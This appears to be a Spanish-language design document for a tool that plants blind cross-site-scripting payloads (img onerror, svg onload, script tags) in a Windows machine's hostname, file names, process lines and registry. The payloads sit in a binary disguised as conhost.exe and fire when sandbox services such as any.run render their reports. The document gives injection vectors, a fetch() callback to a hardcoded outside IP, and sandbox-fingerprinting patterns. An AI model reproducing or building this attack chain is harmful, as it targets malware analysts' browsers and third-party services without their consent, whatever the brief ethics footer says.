# 🏗️ Arquitectura del Módulo XSS Audit

## Diagrama de Flujo Completo

```
┌─────────────────────────────────────────────────────────────────────┐
│                         AGENTE (conhost.exe)                        │
│                         Windows Target System                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Inicio con XSS_AUDIT=true                                      │
│     └─> Lee CALLBACK_SERVER del .env                               │
│                                                                     │
│  2. Genera 10 Payloads XSS Únicos                                  │
│     ├─> Cada payload tiene ID único (UUID)                         │
│     ├─> Tipos: IMG, Script, SVG, Base64                           │
│     └─> Vectores: hostname, filename, process, registry, etc.     │
│                                                                     │
│  3. Inyecta Payloads en el Sistema                                 │
│     ├─> Hostname: PC-<img src=x onerror=fetch(...)>               │
│     ├─> Archivos: malware<script>...</script>.txt                 │
│     ├─> Procesos: cmd.exe /c echo <svg onload=...>                │
│     ├─> Registro: HKCU\Software\XSSTest<img...>                   │
│     ├─> Ventanas: CreateWindow con título XSS                     │
│     └─> Command Line: notepad.exe <payload>                       │
│                                                                     │
│  4. Recopila Datos del Sistema (normal)                            │
│     └─> Sandbox info, system info, EDR, hooks, etc.               │
│                                                                     │
│  5. Envía al Servidor                                               │
│     POST http://54.37.226.179/api/collect                          │
│     {                                                               │
│       "hostname": "PC-<img src=x onerror=...>",                   │
│       "xss_payloads": [                                            │
│         {"id": "a3f2b8c1", "type": "img-onerror", "vector": "hostname"},│
│         {"id": "b7k9m4n2", "type": "svg-onload", "vector": "filename"},│
│         ...                                                         │
│       ],                                                            │
│       ...resto de datos...                                         │
│     }                                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                │ HTTP POST
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                    SANDBOX (any.run, etc.)                          │
│                    Análisis de Malware                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Recibe el binario (conhost.exe)                                │
│                                                                     │
│  2. Ejecuta en entorno aislado                                      │
│     └─> Monitorea comportamiento                                   │
│     └─> Captura artefactos                                         │
│                                                                     │
│  3. Genera Reporte HTML                                             │
│     ├─> Incluye hostname: PC-<img src=x onerror=...>              │
│     ├─> Incluye archivos creados: malware<script>...</script>.txt │
│     ├─> Incluye procesos: cmd.exe /c echo <svg...>                │
│     └─> Incluye claves de registro: HKCU\...\XSSTest<img...>      │
│                                                                     │
│  4. Si el Sandbox NO Sanitiza (VULNERABLE)                         │
│     └─> El HTML contiene XSS sin escapar                           │
│                                                                     │
│  5. Analista Abre el Reporte en su Navegador                       │
│     └─> El XSS se ejecuta                                          │
│     └─> JavaScript: fetch('http://54.37.226.179/xss-callback?id=a3f2b8c1&v=hostname')│
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                │ HTTP GET (Callback)
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  SERVIDOR DJANGO (54.37.226.179)                    │
│                  Ubuntu Server + Nginx + Gunicorn                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ENDPOINT 1: /api/collect (Recibe Ejecución)                       │
│  ────────────────────────────────────────────────────────────────  │
│  POST /api/collect                                                  │
│  {                                                                  │
│    "hostname": "PC-<img...>",                                      │
│    "xss_payloads": [...]                                           │
│  }                                                                  │
│                                                                     │
│  Acción:                                                            │
│  1. Guarda ejecución en AgentExecution                             │
│  2. Guarda payloads en XSSPayload (estado: "injected")            │
│     ├─> payload_id: a3f2b8c1                                       │
│     ├─> type: img-onerror                                          │
│     ├─> vector: hostname                                           │
│     └─> status: injected                                           │
│                                                                     │
│  ────────────────────────────────────────────────────────────────  │
│                                                                     │
│  ENDPOINT 2: /xss-callback (Recibe Hit)                            │
│  ────────────────────────────────────────────────────────────────  │
│  GET /xss-callback?id=a3f2b8c1&v=hostname                          │
│                                                                     │
│  Acción:                                                            │
│  1. Busca payload con id=a3f2b8c1                                  │
│  2. Crea XSSHit:                                                    │
│     ├─> payload: a3f2b8c1                                          │
│     ├─> source_ip: 185.220.xxx.xxx                                │
│     ├─> user_agent: Mozilla/5.0...                                │
│     ├─> referer: https://any.run/report/...                       │
│     └─> triggered_at: 2024-12-03 14:23:45                         │
│  3. Actualiza payload.status = "triggered"                         │
│  4. Identifica sandbox por patrones:                               │
│     └─> Busca "any.run" en referer → Sandbox: any.run             │
│  5. Actualiza/Crea SandboxVulnerability:                           │
│     ├─> sandbox_name: any.run                                      │
│     ├─> hit_count: +1                                              │
│     └─> vulnerable_vectors: [hostname]                            │
│  6. Retorna imagen GIF 1x1 transparente                            │
│                                                                     │
│  ────────────────────────────────────────────────────────────────  │
│                                                                     │
│  ENDPOINT 3: /xss-audit/dashboard/ (Dashboard)                     │
│  ────────────────────────────────────────────────────────────────  │
│  GET /xss-audit/dashboard/                                          │
│                                                                     │
│  Muestra:                                                           │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  📊 Estadísticas                                            │  │
│  │  ├─ Payloads Inyectados: 1,234                             │  │
│  │  ├─ XSS Triggerados: 47 (3.8%)                             │  │
│  │  ├─ Total Hits: 52                                          │  │
│  │  └─ Sandboxes Vulnerables: 8                                │  │
│  │                                                              │  │
│  │  🔥 Últimos XSS Triggerados                                 │  │
│  │  ├─ 2024-12-03 14:23 | a3f2 | hostname | any.run           │  │
│  │  ├─ 2024-12-03 13:45 | b7k9 | filename | hybrid-analysis   │  │
│  │  └─ 2024-12-03 12:10 | c2m4 | process | joe-sandbox        │  │
│  │                                                              │  │
│  │  📊 Vectores Más Exitosos                                   │  │
│  │  ├─ hostname: ████████████████ 18 hits                      │  │
│  │  ├─ filename: ████████████ 12 hits                          │  │
│  │  ├─ process: ████████ 9 hits                                │  │
│  │  └─ registry: ██████ 8 hits                                 │  │
│  │                                                              │  │
│  │  🎯 Sandboxes Identificados                                 │  │
│  │  ├─ any.run: 15 hits (hostname, filename, process)         │  │
│  │  ├─ hybrid-analysis: 12 hits (hostname, filename)          │  │
│  │  └─ joe-sandbox: 8 hits (hostname, registry)               │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Estructura de Datos

### Base de Datos (SQLite)

```
┌─────────────────────────────────────────────────────────────┐
│                     AgentExecution                          │
├─────────────────────────────────────────────────────────────┤
│ guid (PK)                                                   │
│ timestamp                                                   │
│ hostname                                                    │
│ public_ip                                                   │
│ ...                                                         │
└─────────────────────────────────────────────────────────────┘
                    │
                    │ 1:N
                    ▼
┌─────────────────────────────────────────────────────────────┐
│                      XSSPayload                             │
├─────────────────────────────────────────────────────────────┤
│ payload_id (PK)          "a3f2b8c1"                        │
│ execution_id (FK)        → AgentExecution                  │
│ payload_type             "img-onerror"                     │
│ vector                   "hostname"                        │
│ status                   "injected" | "triggered"          │
│ created_at               2024-12-03 14:00:00               │
└─────────────────────────────────────────────────────────────┘
                    │
                    │ 1:N
                    ▼
┌─────────────────────────────────────────────────────────────┐
│                        XSSHit                               │
├─────────────────────────────────────────────────────────────┤
│ id (PK)                                                     │
│ payload_id (FK)          → XSSPayload                       │
│ triggered_at             2024-12-03 14:23:45               │
│ source_ip                "185.220.xxx.xxx"                 │
│ user_agent               "Mozilla/5.0..."                  │
│ referer                  "https://any.run/report/..."      │
│ request_headers (JSON)   {...}                             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                 SandboxVulnerability                        │
├─────────────────────────────────────────────────────────────┤
│ id (PK)                                                     │
│ sandbox_name             "any.run"                         │
│ identified_by            "IP: 185.220.xxx.xxx, UA: ..."   │
│ vulnerable_vectors (JSON) ["hostname", "filename"]         │
│ hit_count                15                                │
│ first_detected           2024-12-01 10:00:00               │
│ last_detected            2024-12-03 14:23:45               │
│ notes                    ""                                │
└─────────────────────────────────────────────────────────────┘
```

---

## Flujo de Estados

```
Payload Lifecycle:
──────────────────

1. CREACIÓN
   ├─> Agente genera payload con ID único
   └─> Estado: (no existe aún)

2. INYECCIÓN
   ├─> Agente inyecta en el sistema
   ├─> Envía metadata al servidor
   └─> Estado: "injected"

3. ESPERANDO
   ├─> Payload está en el sistema
   ├─> Sandbox analiza
   └─> Estado: "injected" (esperando)

4. TRIGGERADO
   ├─> Sandbox genera reporte vulnerable
   ├─> XSS se ejecuta en navegador
   ├─> Callback llega al servidor
   └─> Estado: "triggered"

5. REGISTRADO
   ├─> Hit guardado en base de datos
   ├─> Sandbox identificado
   └─> Estadísticas actualizadas
```

---

## Componentes del Sistema

### Agente (Go)

```
artefacto/
├── xss/
│   ├── payloads.go
│   │   ├─> GeneratePayloadID()
│   │   ├─> GetAllPayloads()
│   │   └─> GetPayloadMetadata()
│   │
│   └── injector.go
│       ├─> InjectPayloads()
│       ├─> injectIntoFilename()
│       ├─> injectIntoProcess()
│       ├─> injectIntoRegistry()
│       ├─> injectIntoWindow()
│       └─> injectIntoCmdLine()
│
├── models/payload.go
│   └─> XSSPayloadMetadata struct
│
├── config/config.go
│   ├─> XSSAudit bool
│   └─> CallbackServer string
│
└── main.go
    └─> injectXSSAudit()
```

### Servidor (Django)

```
visualizer/
├── xss_audit/
│   ├── models.py
│   │   ├─> XSSPayload
│   │   ├─> XSSHit
│   │   └─> SandboxVulnerability
│   │
│   ├── views.py
│   │   ├─> xss_callback()        # Recibe hits
│   │   ├─> xss_dashboard()       # Dashboard principal
│   │   ├─> xss_hit_detail()      # Detalle de hit
│   │   ├─> xss_payloads_list()   # Lista de payloads
│   │   ├─> sandbox_detail()      # Detalle de sandbox
│   │   └─> identify_sandbox()    # Identificación
│   │
│   ├── urls.py
│   │   ├─> /xss-callback
│   │   ├─> /xss-audit/dashboard/
│   │   ├─> /xss-audit/hit/<id>/
│   │   ├─> /xss-audit/payloads/
│   │   └─> /xss-audit/sandbox/<id>/
│   │
│   └── templates/xss_audit/
│       └── dashboard.html
│
└── collector/views.py
    └─> collect_data()  # Guarda payloads XSS
```

---

## Patrones de Identificación de Sandboxes

```python
sandbox_patterns = {
    'any.run': ['any.run', 'anyrun'],
    'hybrid-analysis': ['hybrid-analysis', 'falcon'],
    'joe-sandbox': ['joe', 'joesan'],
    'tria.ge': ['triage', 'hatching'],
    'virustotal': ['virustotal', 'vt'],
    'cuckoo': ['cuckoo'],
    'cape': ['cape'],
}

# Busca en:
# - User-Agent
# - Referer
# - IP ranges conocidos
```

---

## Seguridad y Consideraciones

### Endpoint Público (/xss-callback)

- ✅ Sin autenticación (necesario para que funcione)
- ✅ Solo acepta GET
- ✅ Retorna imagen GIF (no HTML)
- ✅ No ejecuta código del usuario
- ✅ Validación de payload_id
- ✅ Rate limiting (por Nginx)

### Privacidad

- ✅ No exfiltra cookies
- ✅ No exfiltra tokens
- ✅ Solo registra: IP, user-agent, referer
- ✅ No captura contenido de la página

### Ética

- ⚠️ Solo para investigación de seguridad
- ⚠️ Obtener permiso antes de probar
- ⚠️ Disclosure responsable
- ⚠️ Documentar todo

---

**Arquitectura diseñada para ser robusta, escalable y ética.**
